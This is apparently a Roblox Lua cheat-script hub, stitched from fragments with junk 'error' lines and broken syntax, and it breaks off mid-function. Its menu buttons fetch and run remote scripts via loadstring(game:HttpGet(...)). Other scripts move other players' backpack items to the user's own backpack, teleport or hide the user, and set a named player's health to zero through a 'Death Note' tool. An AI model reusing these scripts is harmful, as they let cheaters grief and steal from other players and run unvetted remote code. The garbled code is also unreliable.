error--59034-50-3095-039-09-5903-495-039-509-03094-5093-4059-03945-904-3095-3590-
error-3-09-3950-39-50394-59-3409-093-09-095-0349-509359-3095-0395-093-4095-03945-0934-5
error--350-0-04569-096-6409-694-06-409-0496-049-69-49-6904-9506-49069-495-6
]]



game.Lighting.GlobalShadows = false
game.Lighting.Brightness = 0.25


local function Smooth(Part)
	Part.TopSurface = Enum.SurfaceType.SmoothNoOutlines
	Part.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
	Part.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
	Part.RightSurface = Enum.SurfaceType.SmoothNoOutlines
	Part.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
	Part.BackSurface = Enum.SurfaceType.SmoothNoOutlines
end


local function SetLine(Line, Alpha, Beta)
	local dx = Alpha.Position.X.Scale - Beta.Position.X.Scale
	local dy = Alpha.Position.Y.Scale - Beta.Position.Y.Scale
	local Magnitude = math.sqrt(dx^2 + dy^2)
	
	Line.Size = UDim2.new(Magnitude, 0, 0, 8)
	Line.Position = Alpha.Position:Lerp(Beta.Position, 0.5)
	Line.Rotation = math.deg(math.atan2(dy, dx))
end


local Keyboard = Instance.new("Part")
Keyboard.BrickColor = BrickColor.new("Really black")
Keyboard.Material = Enum.Material.Neon
Keyboard.Transparency = 0.1
Keyboard.Size = Vector3.new(5, 0, 2)
Keyboard.CanCollide = false
Keyboard.Locked = true

Smooth(Keyboard)

local KeyboardWeld = Instance.new("Weld")
KeyboardWeld.Part0 = Torso
KeyboardWeld.Part1 = Keyboard
KeyboardWeld.C0 = CFrame.new(0, 0.2, -2) * CFrame.Angles(0.3, 0, 0)

KeyboardWeld.Parent = Keyboard
Keyboard.Parent = Character


local Light = Instance.new("PointLight")
Light.Brightness = 1.5
Light.Range = 12
Light.Parent = Keyboard


local Screen = Instance.new("Part")
Screen.BrickColor = BrickColor.new("Really black")
Screen.Material = Enum.Material.Neon
Screen.Transparency = 0.3
Screen.Size = Vector3.new(6, 4, 0)
Screen.CanCollide = false
Screen.Locked = true

Smooth(Screen)

local ScreenWeld = Instance.new("Weld")
ScreenWeld.Part0 = Torso
ScreenWeld.Part1 = Screen
ScreenWeld.C0 = CFrame.new(0, 3.5, -4.5) * CFrame.Angles(0.1, 0, 0)

local Gui = Instance.new("SurfaceGui")
Gui.Face = "Back"
Gui.Adornee = Screen
Gui.Parent = Screen

local Text = Instance.new("TextBox")
Text.BackgroundTransparency = 1
Text.Position = UDim2.new(0, 0, 0, 0)
Text.Size = UDim2.new(1, 0, 1, 0)
Text.TextColor3 = Color3.new(1, 1, 1)
Text.Font = Enum.Font.Code
Text.Active = false
Text.MultiLine = true
Text.TextWrapped = true
Text.FontSize = Enum.FontSize.Size32
Text.TextXAlignment = Enum.TextXAlignment.Left
Text.TextYAlignment = Enum.TextYAlignment.Top
Text.Text = ""

Text.Parent = Gui

ScreenWeld.Parent = Screen
Screen.Parent = Character



local Screen2 = Instance.new("Part")
Screen2.BrickColor = BrickColor.new("Really black")
Screen2.Material = Enum.Material.Neon
Screen2.Transparency = 0.3
Screen2.Size = Vector3.new(6, 4, 0)
Screen2.CanCollide = false
Screen2.Locked = true

Smooth(Screen2)

local Screen2Weld = Instance.new("Weld")
Screen2Weld.Part0 = Torso
Screen2Weld.Part1 = Screen2
Screen2Weld.C0 = CFrame.new(5.4, 3.4, -1.5) * CFrame.Angles(0.1, -0.9, 0)

local Gui2 = Instance.new("SurfaceGui")
Gui2.Face = "Back"
Gui2.Adornee = Screen2
Gui2.Parent = Screen2

local Text2 = Instance.new("TextBox")
Text2.BackgroundTransparency = 1
Text2.Position = UDim2.new(0, 0, 0, 0)
Text2.Size = UDim2.new(1, 0, 1, 0)
Text2.TextColor3 = Color3.new(0, 1, 0)
Text2.Font = Enum.Font.Code
Text2.Active = false
Text2.MultiLine = true
Text2.TextWrapped = true
Text2.FontSize = Enum.FontSize.Size32
Text2.TextXAlignment = Enum.TextXAlignment.Left
Text2.TextYAlignment = Enum.TextYAlignment.Top
Text2.Text = ""

Text2.Parent = Gui2

local ImageKey = Instance.new("ImageLabel")
ImageKey.BackgroundTransparency = 1
ImageKey.Size = UDim2.new(0.2, 0, 0.2, 0)
ImageKey.Position = UDim2.new(0.4, 0, 0.4, 0)
ImageKey.Image = "http://www.roblox.com/asset/?id=697224414"
ImageKey.ImageTransparency = 1
ImageKey.Parent = Gui2

Screen2Weld.Parent = Screen2
Screen2.Parent = Character



local Screen3 = Instance.new("Part")
Screen3.BrickColor = BrickColor.new("Really black")
Screen3.Material = Enum.Material.Neon
Screen3.Transparency = 0.3
Screen3.Size = Vector3.new(6, 4, 0)
Screen3.CanCollide = false
Screen3.Locked = true

Smooth(Screen3)

local Screen3Weld = Instance.new("Weld")
Screen3Weld.Part0 = Torso
Screen3Weld.Part1 = Screen3
Screen3Weld.C0 = CFrame.new(-5.4, 3.4, -1.5) * CFrame.Angles(0.1, 0.9, 0)

local Gui3 = Instance.new("SurfaceGui")
Gui3.Face = "Back"
Gui3.Adornee = Screen3
Gui3.Parent = Screen3

local Map = Instance.new("ImageLabel")
Map.BackgroundTransparency = 1
Map.Position = UDim2.new(0, 0, 0, 0)
Map.Size = UDim2.new(1, 0, 1, 0)
Map.Image = "http://www.roblox.com/asset/?id=121661614"

Map.Parent = Gui3

Screen3Weld.Parent = Screen3
Screen3.Parent = Character

local Points = {}
local Lines = {}

for i = 1, 10 do
	if i > 1 then
		local Line = Instance.new("Frame")
		Line.BorderSizePixel = 0
		Line.BackgroundColor3 = Color3.new(0.8, 0, 0)
		Line.AnchorPoint = Vector2.new(0.5, 0.5)
		Line.Parent = Gui3
		
		Lines[i] = Line
	end
	
	local Point = Instance.new("Frame")
	Point.BorderSizePixel = 0
	Point.BackgroundColor3 = Color3.new(1, 0, 0)
	Point.Size = UDim2.new(0, 40, 0, 40)
	Point.Position = UDim2.new(math.random(), 0, math.random(), 0)
	Point.AnchorPoint = Vector2.new(0.5, 0.5)
	Point.Parent = Gui3
	
	Points[i] = {Point = Point, Position = Point.Position}
end




UserInputService.InputBegan:Connect(function(Input, Processed)
	if Processed then return end
	
	if Input.UserInputType == Enum.UserInputType.Keyboard then
		local KeyCode = Input.KeyCode
		
		if KeyCode == Enum.KeyCode.E then
			Typing = not Typing
		end
	end
end)



RunService.Heartbeat:Connect(function()
	local Sine = math.sin(tick() * 8) / 8
	
	for Key, Value in next, Points do
		Value.Point.Size = UDim2.new(0, 25 + Sine * 40, 0, 25 + Sine * 40)
		Value.Point.Position = Value.Point.Position:Lerp(Value.Position, 0.1)
		
		if Key > 1 then
			SetLine(Lines[Key], Value.Point, Points[1].Point)
		end
	end
	
	if math.random(100) == 1 then
		for _, Value in next, Points do
			Value.Position = UDim2.new(math.random(), 0, math.random(), 0)
		end
	end
	
	ImageKey.ImageTransparency = math.abs(math.sin(tick()))
	
	if Typing then
		if math.random(5) == 1 then
			local PressSound = Instance.new("Sound")
			PressSound.SoundId = "rbxassetid://265970978"
			PressSound.Pitch = 0.5 + math.random() / 5
			PressSound.Volume = 3
			PressSound.Parent = Keyboard
			PressSound:Play()
			
			game:GetService("Debris"):AddItem(PressSound, 1 / 2)
		end
		
		Neck.C0 = CFrame.new(0, 1, 0) * CFrame.Angles(-0.2 + Sine / 4, (math.random() - 0.5) / 2, 0)
		
		RightShoulder.C0 = CFrame.new(1, 0.6 + math.random() / 4, -math.random() * 0.7)
			* CFrame.Angles(1.5 + Sine * math.random(), -Sine / 4, -(0.5 + 2 * Sine * math.random()))
		
		LeftShoulder.C0 = CFrame.new(-1, 0.6 + math.random() / 4, -math.random() * 0.7)
			* CFrame.Angles(1.5 - Sine * math.random(), Sine / 4, 0.5 + 2 * Sine * math.random())
		
		if math.random(2) == 1 then
			if TypingSub < #Argument then
				TypingSub = TypingSub + 1
				Text.Text = Text.Text..Argument:sub(TypingSub, TypingSub)
				
				local nl = Text.Text:find("\n")
				
				if nl and #Text.Text > 400 then
					Text.Text = Text.Text:sub(nl + 1)
				end
				
			else
				TypingSub = 1
			end
		end
		
		if math.random(3) == 1 then
			if TypingSub2 < #Code then
				TypingSub2 = TypingSub2 + 1
				Text2.Text = Text2.Text..Code:sub(TypingSub2, TypingSub2)
				
				local nl = Text2.Text:find("\n")
				
				if nl and #Text2.Text > 400 then
					Text2.Text = Text2.Text:sub(nl + 1)
				end
				
			else
				TypingSub2 = 1
			end
		end
		
	else
		Neck.C0 = CFrame.new(0, 1, 0)
		
		RightShoulder.C0 = CFrame.new(1, 0.5, 0) * CFrame.Angles(1.5, 0, 0)
		LeftShoulder.C0 = CFrame.new(-1, 0.5, 0) * CFrame.Angles(1.5, 0, 0)
	end
end)

























plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
part = nil
bp = nil
particles = nil
function clerp(a,b,c,d)
	for i = 0,d,.01 do
		a.CFrame = CFrame.new(b:lerp(c,i))
		wait()
	end
end
function slerp(a2,b2,c2,d2)
	for i2 = 0,d2,.01 do
		a2.CFrame = CFrame.new(b2:lerp(c2,i2))
		wait()
	end
end
mouse.KeyDown:connect(function(key)
	if key == "e" and plr.Character.Parent == workspace then
		plr.Character.Parent = workspace.Camera
		plr.Character.Archivable = true
		Instance.new("ForceField",plr.Character).Visible = false
		for y,t in pairs(plr.Character:GetChildren()) do
			if t:IsA("Part") and t.Name ~= "HumanoidRootPart" then
				t.Transparency = 1
				if t.Name == "Head" and t:FindFirstChild("face") then
					t.face.Transparency = 1
				end
			elseif t:IsA("Accessory") and t:FindFirstChild("Handle") then
				t.Handle.Transparency = 1
			end
		end
	elseif key == "z" and plr.Character.Parent == workspace.Camera and part == nil then
		plr.Character.Torso.CFrame = CFrame.new(Vector3.new(mouse.hit.p.X,mouse.hit.p.Y+1.5,mouse.hit.p.Z),plr.Character.Torso.CFrame.p)
	elseif key == "x" and plr.Character.Parent == workspace.Camera and part == nil then
		if plr.Character.Torso.Anchored == true then
			for y,t in pairs(plr.Character:GetChildren()) do
				if t:IsA("Part") then
					t.Anchored = false
				end
			end
		else
			for y,t in pairs(plr.Character:GetChildren()) do
				if t:IsA("Part") then
					t.Anchored = true
				end
			end
		end
	elseif key == "c" and plr.Character.Parent == workspace.Camera and part ~= nil then
		local clone = part:Clone()
		clone.Parent = workspace
		clone.Anchored = false
		clone:ClearAllChildren()
		clone.CanCollide = true
		bp.Parent = clone
		particles.Parent = clone
		if part.Parent:FindFirstChildOfClass("Humanoid") then
			part.Parent:FindFirstChildOfClass("Humanoid").PlatformStand = false
		end
		part:Destroy()
		part = clone
	elseif key == "q" and plr.Character.Parent == workspace.Camera and part == nil then
		plr.Character.Parent = workspace
		plr.Character.Archivable = false
		plr.Character:FindFirstChildOfClass("ForceField"):Remove()
		for y,t in pairs(plr.Character:GetChildren()) do
			if t:IsA("Part") and t.Name ~= "HumanoidRootPart" then
				t.Transparency = 0
				if t.Name == "Head" and t:FindFirstChild("face") then
					t.face.Transparency = 0
				end
			elseif t:IsA("Accessory") and t:FindFirstChild("Handle") then
				t.Handle.Transparency = 0
			end
		end
	end
end)
mouse.Button1Down:connect(function()
	if plr.Character.Parent == workspace.Camera then
		if mouse ~= nil then
			if mouse.Target ~= nil then
				part = mouse.Target
				bp = Instance.new("BodyPosition",part)
				bp.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
				bp.Position = part.Position
				particles = Instance.new("ParticleEmitter",part)
				particles.Color = ColorSequence.new(Color3.new(0,0,0))
				particles.Size = NumberSequence.new(1)
				particles.Texture = "rbxassetid://292289455"
				particles.VelocitySpread = 360
				particles.Speed = NumberRange.new(0)
				particles.RotSpeed = NumberRange.new(0)
				particles.Rotation = NumberRange.new(0)
				particles.Rate = 250
				particles.Lifetime = NumberRange.new(.2,.4)
				particles.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,1,0),NumberSequenceKeypoint.new(.12,.688,0),NumberSequenceKeypoint.new(.891,.887,0),NumberSequenceKeypoint.new(1,1,0)})
				dwn = true
			end
		end
		while dwn == true do 
			wait()	
			bp.Position = mouse.hit.p
			if part then
				if part.Parent:FindFirstChildOfClass("Humanoid") then
					part.Parent:FindFirstChildOfClass("Humanoid").PlatformStand = true
				end
			end
		end
	end
end)
mouse.Button1Up:connect(function()
	dwn = false
	if part then if part.Parent:FindFirstChildOfClass("Humanoid") then part.Parent:FindFirstChildOfClass("Humanoid").PlatformStand = false end part = nil end
	if bp then bp:Destroy() end
	if particles then particles:Destroy() end
end)
base = Instance.new("ScreenGui",plr.PlayerGui)
bbg = Instance.new("BillboardGui",plr.Character.Head)
bbg.Size = UDim2.new(0,200,0,50)
bbg.StudsOffset = Vector3.new(0,3,0)
bbgTl = Instance.new("TextLabel",bbg)
bbgTl.BackgroundTransparency = 1
bbgTl.Size = UDim2.new(10,0,1,0)
bbgTl.Position = UDim2.new(-4.5,0,0,0)
bbgTl.Font = "Code"
bbgTl.Text = " "
bbgTl.TextSize = 25
bbgTl.TextStrokeColor3 = Color3.new(1,1,1)
bbgTl.TextColor3 = Color3.new(0,0,0)
bbgTl.TextStrokeTransparency = 0
bbgTl.TextWrapped = true
plr.Chatted:connect(function(msg)
	bbgTl.Text = msg
	wait(5)
	if bbgTl.Text == msg then
		bbgTl.Text = " "
	end
end)
touchCounter = 0
while wait() do
	if plr.Character.Parent == workspace.Camera then
		local c = plr.Character:Clone()
		c:MakeJoints()
		for y,t in pairs(c:GetChildren()) do
			if t:IsA("Part") then
				t.CanCollide = false 
				t.Anchored = true 
				t.Transparency = .5
				t.TopSurface = "Smooth"
				t.BottomSurface = "Smooth"
				t.RightSurface = "Smooth"
				t.LeftSurface = "Smooth"
				t.FrontSurface = "Smooth"
				t.BackSurface = "Smooth"
				t.BrickColor = BrickColor.new("Really black")
				if t.Name == "Head" and t:FindFirstChild("face") then
					t.face:Remove()
				elseif t.Name == "Torso" and t:FindFirstChild("roblox") then
					t.roblox:Remove()
				elseif t.Name == "HumanoidRootPart" then
					t:Remove()
				end
			else 
				t:Remove()
			end
		end
		c.Parent = workspace
		game.Debris:AddItem(c,.05)
	end
end

  	end    

})

Tab:AddButton({

Tab:AddButton({

	Name = "亚瑟圣剑",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/8/refs/heads/main/%E4%BA%9A%E7%91%9F%E5%9C%A3%E5%89%91.txt"))()

  	end    

})

Tab:AddButton({

	Name = "死亡巨眼",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/9/refs/heads/main/%E6%AD%BB%E4%BA%A1%E5%B7%A8%E7%9C%BC.txt"))()

  	end    

})

Tab:AddButton({

	Name = "五悟持镰刀",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/10/refs/heads/main/%E4%BA%94%E6%82%9F%E6%8C%81%E9%95%B0%E5%88%80.txt"))()

  	end    

})

local Tab = Window:MakeTab({

    Name = "物品功能",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({

	Name = "偷别人物品",

	Callback = function()

     --Copy And Paste:
for i,v in pairs (game.Players:GetChildren()) do
wait()
for i,b in pairs (v.Backpack:GetChildren()) do
b.Parent = game.Players.LocalPlayer.Backpack
end
end

  	end    

})

Tab:AddButton({

	Name = "传送工具",

	Callback = function()

     mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "[FE] TELEPORT TOOL" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack

  	end    

})

Tab:AddButton({

	Name = "建筑工具",

	Callback = function()

     loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()

  	end    

})

Tab:AddButton({

	Name = "隐身工具",

	Callback = function()

     loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))()

  	end    

})

Tab:AddButton({

	Name = "死亡笔记",

	Callback = function()

     --Made by Hirari_Tear, credits to expro for the GUI--

local Handle = Instance.new('Part')

local Mesh = Instance.new('SpecialMesh')

local Death = Instance.new('Tool')

Death.Name = "Death Note"

Handle.Name = "Handle"

Death.Parent = game.Players.LocalPlayer.Backpack

Death.GripForward = Vector3.new(0.331, -0.766, 0.551)

Death.GripPos = Vector3.new(-0.8, 0, -0.8)

Death.GripRight = Vector3.new(-0.943, -0.297, 0.152)

Death.GripUp = Vector3.new(-0.048, 0.57, 0.82)

Death.ToolTip = "Kill your fucking rival"

Handle.Parent = Death

Mesh.Parent = Handle

Mesh.MeshId = "http://www.roblox.com/asset/?id=1136139"

Mesh.TextureId = "http://www.roblox.com/asset/?id=18276952"

Mesh.Scale = Vector3.new(0.55, 0.174, 0.6)

Handle.Rotation = Vector3.new(0,-90,0)

Death.Equipped:connect(function(mouse)

local Bounce = Enum.EasingStyle.Bounce

local Quad = Enum.EasingStyle.Quad

local Normal = Enum.EasingStyle.Linear



local ScreenGui = Instance.new("ScreenGui", game.Players["LocalPlayer"].PlayerGui)

ScreenGui.Name = "Death Note"



local open = Instance.new("ImageButton", ScreenGui)

open.Position = UDim2.new(1, -110, 1, 500)

open.Size = UDim2.new(0, 100,0, 150)

open.Image = "rbxassetid://18536731"

open:TweenPosition(UDim2.new(1, -110, 1, -150), "In", Bounce, 0.8, true)



local Note = Instance.new("Frame", ScreenGui)

Note.Active = true

Note.Position = UDim2.new(1, -321, 1, 500)

Note.Size = UDim2.new(0, 320,0, 250)

Note.Visible = false

Note.Draggable = true



open.MouseButton1Down:connect(function()

open:TweenPosition(UDim2.new(open.Position.X.Scale,open.Position.X.Offset, 1, 500), "Out", Normal, 0.8, true)

wait(0.30)

open.Visible = false

Note.Visible = true

Note.Position = UDim2.new(1, -321, 1, 500)

Note:TweenPosition(UDim2.new(1, -321, 1, -251), "In", Normal, 0.5, true)

end)



local bg = Instance.new("Frame", Note)

bg.BackgroundColor3 = Color3.fromRGB(31, 31, 31)

bg.Size = UDim2.new(0, 160,0, 250)

bg.ZIndex = 2



-- Background



local close = Instance.new("TextButton", bg)

close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

close.BackgroundTransparency = 1

close.Position = UDim2.new(0, 8,0, 10)

close.Size = UDim2.new(0, 10,0, 10)

close.ZIndex = 4

close.Font = "Cartoon"

close.Text = "X"

close.TextColor3 = Color3.fromRGB(255, 255, 255)

close.TextSize = "17"



close.MouseButton1Down:connect(function()

Note:TweenPosition(UDim2.new(Note.Position.X.Scale,Note.Position.X.Offset,1, 500), "Out", Normal, 0.5, true)

wait(0.30)

Note.Visible = false

open.Visible = true

open:TweenPosition(UDim2.new(1, -110, 1, -150), "In", Normal, 0.8, true)

end)



local image1 = Instance.new("ImageLabel", bg)

image1.BackgroundTransparency = 1

image1.Size = UDim2.new(1, 0,1, 0)

image1.ZIndex = 3

image1.Image = "rbxassetid://18528551"



local title = Instance.new("TextLabel", bg)

title.BackgroundTransparency = 1

title.Position = UDim2.new(0, 0,0, 30)

title.Size = UDim2.new(1, 0,0, 30)

title.ZIndex = 4

title.Font = "Bodoni"

title.Text = "DEATH NOTE"

title.TextColor3 = Color3.fromRGB(255, 255, 255)

title.TextSize = "18"



local body = Instance.new("TextLabel", bg)

body.BackgroundTransparency = 1

body.Position = UDim2.new(0, 15,0, 65)

body.Size = UDim2.new(0, 134,0, 40)

body.ZIndex = 4

body.Font = "Garamond"

body.Text = "Type in somebody's name to kill them."

body.TextColor3 = Color3.fromRGB(255, 255, 255)

body.TextSize = "19"

body.TextWrapped = true

body.TextXAlignment = "Left"

body.TextYAlignment = "Top"



local line = Instance.new("TextLabel", body)

line.BackgroundTransparency = 1

line.Position = UDim2.new(0, 0,0, 50)

line.Size = UDim2.new(0, 130,0, 40)

line.ZIndex = 4

line.Font = "Garamond"

line.Text = "________________"

line.TextColor3 = Color3.fromRGB(255, 255, 255)

line.TextSize = "19"

line.TextWrapped = true

line.TextXAlignment = "Left"

line.TextYAlignment = "Top"



local text = Instance.new("TextLabel", body)

text.BackgroundTransparency = 1

text.Position = UDim2.new(0, 0,0, 100)

text.Size = UDim2.new(0, 134,0, 40)

text.ZIndex = 4

text.Font = "Garamond"

text.Text = "This was made by RcDZ."

text.TextColor3 = Color3.fromRGB(255, 255, 255)

text.TextSize = "19"

text.TextWrapped = true

text.TextXAlignment = "Left"

text.TextYAlignment = "Top"



-- Page



local page = Instance.new("Frame", Note)

page.BackgroundColor3 = Color3.fromRGB(236, 236, 236)

page.Position = UDim2.new(0, 160,0, 0)

page.Size = UDim2.new(0, 160,0, 250)

page.ZIndex = 2



local list = Instance.new("TextBox", page)

list.BackgroundTransparency = 1

list.Position = UDim2.new(0, 25,0, 20)

list.Size = UDim2.new(0.8, 5,0, 230)

list.ZIndex = 4

list.Font = "Antique"

list.Text = ""

list.TextColor3 = Color3.fromRGB(0, 0, 0)

list.TextSize = "23"

list.TextWrapped = true

list.TextXAlignment = "Left"

list.TextYAlignment = "Top"



local image2 = Instance.new("ImageLabel", page)

image2.BackgroundTransparency = 1

image2.Size = UDim2.new(1, 0,1, 0)

image2.ZIndex = 3

image2.Image = "rbxassetid://170279713"

image2.Transparency = 0.2



while true do

repeat wait() until game.Workspace:FindFirstChild(list.Text)

if game.Workspace[list.Text]:FindFirstChild("Humanoid") then

game.Workspace[list.Text].Humanoid.PlatformStand = true

game.Workspace[list.Text].Humanoid.Health = 0

elseif game.Workspace[list.Text]:FindFirstChild("Zombie") then

game.Workspace[list.Text].Zombie.PlatformStand = true

game.Workspace[list.Text].Zombie.Health = 0

end

end

end)

Death.Unequipped:connect(function(mouse)

game.Players.LocalPlayer.PlayerGui["Death Note"]:remove()

end)
--12333

  	end    

})

Tab:AddButton({

	Name = "分头行动",

	Callback = function()

     --made by Nightmare#0930
local lp = game.Players.LocalPlayer
local char = lp.Character

for i, v in pairs(char:GetChildren()) do
    if v:IsA("BallSocketConstraint") then
        v:Destroy()
    end
end

for i, v in pairs(char:GetChildren()) do
    if v:IsA("HingeConstraint") then
        v:Destroy()
    end
end

for i, v in pairs(char.Humanoid:GetAccessories()) do
local hat = v.Name

char[hat].Archivable = true
local fake = char[hat]:Clone()
fake.Parent = char
fake.Handle.Transparency = 1

local hold = false
local enabled = false

char[hat].Handle.AccessoryWeld:Destroy()

local tool = Instance.new("Tool", lp.Backpack)
tool.RequiresHandle = true
tool.CanBeDropped = false
tool.Name = hat

local handle = Instance.new("Part", tool)
handle.Name = "Handle"
handle.Size = Vector3.new(1, 1, 1)
handle.Massless = true
handle.Transparency = 1

local positions = {
    forward = tool.GripForward,
    pos = tool.GripPos,
    right = tool.GripRight,
    up = tool.GripUp
}

tool.Equipped:connect(function()
 hold = true
end)

tool.Unequipped:connect(function()
   hold = false
end)

tool.Activated:connect(function()
    if enabled == false then
        enabled = true
        tool.GripForward = Vector3.new(-0.976,0,-0.217)
    tool.GripPos = Vector3.new(.95,-0.76,1.4)
    tool.GripRight = Vector3.new(0.217,0, 0.976)
    tool.GripUp = Vector3.new(0,1,0)
    wait(.8)
    tool.GripForward = positions.forward
    tool.GripPos = positions.pos
    tool.GripRight = positions.right
    tool.GripUp = positions.up
    enabled = false
    end
end)

game:GetService("RunService").Heartbeat:connect(function()
    pcall(function()
       char[hat].Handle.Velocity = Vector3.new(30, 0, 0)
if hold == false then
    char[hat].Handle.CFrame = fake.Handle.CFrame
elseif hold == true then
    char[hat].Handle.CFrame = handle.CFrame
    end
end)
end)
end

  	end    

})

Tab:AddButton({

	Name = "小刀（没用）",

	Callback = function()

     --e = Kill 
--q = Fix Knife


me = game.Players.LocalPlayer
char = me.Character
selected = false
attacking = false
hurt = false
grabbed = nil
mode = "kill"
bloodcolors = {"Bright red", "Really red", "Crimson"}
enabled = true
enabled2 = true

local breaksound = Instance.new("Sound")
breaksound.SoundId = "http://www.roblox.com/asset/?id=2801263"
breaksound.Parent = game.Workspace
breaksound.Volume = 0.8
	
local killsound = Instance.new("Sound")
killsound.SoundId = "http://www.roblox.com/asset?id=16950449"
killsound.Pitch = 0.65
killsound.Parent = game.Workspace

local drainsound = Instance.new("Sound")
drainsound.SoundId = "http://www.roblox.com/asset/?id=2785493"
drainsound.Pitch = 0.7


function prop(part, parent, collide, tran, ref, x, y, z, color, anchor, form)
part.Parent = parent
part.formFactor = form
part.CanCollide = collide
part.Transparency = tran
part.Reflectance = ref
part.Size = Vector3.new(x,y,z)
part.BrickColor = BrickColor.new(color)
part.TopSurface = 0
part.BottomSurface = 0
part.Anchored = anchor
part.Locked = true
part:BreakJoints()
end

function weld(w, p, p1, a, b, c, x, y, z)
w.Parent = p
w.Part0 = p
w.Part1 = p1
w.C1 = CFrame.fromEulerAnglesXYZ(a,b,c) * CFrame.new(x,y,z)
end

function mesh(mesh, parent, x, y, z, type)
mesh.Parent = parent
mesh.Scale = Vector3.new(x, y, z)
mesh.MeshType = type
end

function remgui()
	for _,v in pairs(me.PlayerGui:GetChildren()) do
		if v.Name == "Modeshow" then
			v:remove()
		end
	end
end

function inform(text,delay)
	remgui()
	local sc = Instance.new("ScreenGui")
	sc.Parent = me.PlayerGui
	sc.Name = "Modeshow"
	local bak = Instance.new("Frame",sc)
	bak.BackgroundColor3 = Color3.new(1,1,1)
	bak.Size = UDim2.new(0.94,0,0.1,0)
	bak.Position = UDim2.new(0.03,0,0.037,0)
	bak.BorderSizePixel = 0
	local gi = Instance.new("TextLabel",sc)
	gi.Size = UDim2.new(0.92,0,0.09,0)
	gi.BackgroundColor3 = Color3.new(0,0,0)
	gi.Position = UDim2.new(0.04,0,0.042,0)
	gi.TextColor3 = Color3.new(1,1,1)
	gi.FontSize = "Size14"
	gi.Text = text
	coroutine.resume(coroutine.create(function()
		wait(delay)
		sc:remove()
	end))
end

if char:findFirstChild("Bricks",true) then
	char:findFirstChild("Bricks",true):remove()
end

bricks = Instance.new("Model",me.Character)
bricks.Name = "Bricks"

--Parts-------------------------Parts-------------------------Parts-------------------------Parts----------------------

rarm = char:findFirstChild("Right Arm")
larm = char:findFirstChild("Left Arm")
lleg = char:findFirstChild("Left Leg")
torso = char:findFirstChild("Torso")
hum = char:findFirstChild("Humanoid")
rleg = char:findFirstChild("Right Leg")

righthold = Instance.new("Part")
prop(righthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Mid gray", false, "Custom")
w11 = Instance.new("Weld")
weld(w11, rarm, righthold, 0, 0, 0, 0, 1, 0)

lefthold = Instance.new("Part")
prop(lefthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Mid gray", false, "Custom")
w12 = Instance.new("Weld")
weld(w12, larm, lefthold, 0, 0, 0, 0, 1, 0)

hold = Instance.new("Part")
prop(hold, bricks, false, 0, 0, 0.2, 0.3, 0.3, "Black", false, "Custom")
oh = Instance.new("Weld")
weld(oh, torso, hold, -math.pi/-0.86, 1.5, math.rad(0), -0.35, -0.4, -0.5)

knife = Instance.new("Part")
knife.Material = "Wood"
prop(knife, bricks, false, 0, 0, 0.25, 1.1, 0.3, "Pine Cone", false, "Custom")
orr = Instance.new("Weld")
weld(orr, hold, knife, 0, 0, 0, 0, 0.7, 0)
ar = Instance.new("Weld")
weld(ar, lefthold, nil, math.pi/2, 0, math.pi, 0, 0, 0)

blade = Instance.new("Part")
blade.Material = "Neon"
prop(blade, bricks, false, 0, 0, 0.1, 2.5, 0.25, "Mid gray", false, "Custom")
Instance.new("BlockMesh",blade).Scale = Vector3.new(0.3,1,1)
w2 = Instance.new("Weld")
weld(w2, knife, blade, 0, 0, 0, 0, -0.65, 0)

blade2 = Instance.new("Part")
blade2.Material = "Neon"
prop(blade2, bricks, false, 0, 0, 0.1, 0.4, 0.25, "Mid gray", false, "Custom")
local mew = Instance.new("SpecialMesh",blade2)
mew.MeshType = "Wedge"
mew.Scale = Vector3.new(0.3,1,1)
w3 = Instance.new("Weld")
weld(w3, blade, blade2, 0, 0, 0, 0, -1.45, 0)


rb = Instance.new("Part")
prop(rb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Bright red", false, "Custom")
w13 = Instance.new("Weld")
weld(w13, torso, rb, 0, 0, 0, -1.5, -0.5, 0)

lb = Instance.new("Part")
prop(lb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "Bright red", false, "Custom")
w14 = Instance.new("Weld")
weld(w14, torso, lb, 0, 0, 0, 1.5, -0.5, 0)

rw = Instance.new("Weld")
weld(rw, rb, nil, 0, 0, 0, 0, 0.5, 0)

lw = Instance.new("Weld")
weld(lw, lb, nil, 0, 0, 0, 0, 0.5, 0)

grabweld = nil
platlol = nil
lolhum = nil

function touch(h)
	if hurt then
		if grabbed == nil then
			local hu = h.Parent:findFirstChild("Humanoid")
			local head = h.Parent:findFirstChild("Head")
			local torz = h.Parent:findFirstChild("Torso")
			if hu ~= nil and head ~= nil and torz ~= nil and h.Parent.Name ~= name then
				if hu.Health > 0 then
				grabbed = torz
				hu.PlatformStand = true
				local w = Instance.new("Weld")
				weld(w,righthold,grabbed,math.pi/2,0.2,0,0.7,-0.9,-0.6)
				grabweld = w
				lolhum = hu
				local lolxd = true
				platlol = lolxd
				hu.Changed:connect(function(prop)
					if prop == "PlatformStand" and platlol then
						hu.PlatformStand = true
					end
				end)
				end
			end
		end
	end
end

righthold.Touched:connect(touch)
lefthold.Touched:connect(touch)

function bleed(part,po)
	local lol1 = math.random(5,30)/100
	local lol2 = math.random(5,30)/100
	local lol3 = math.random(5,30)/100
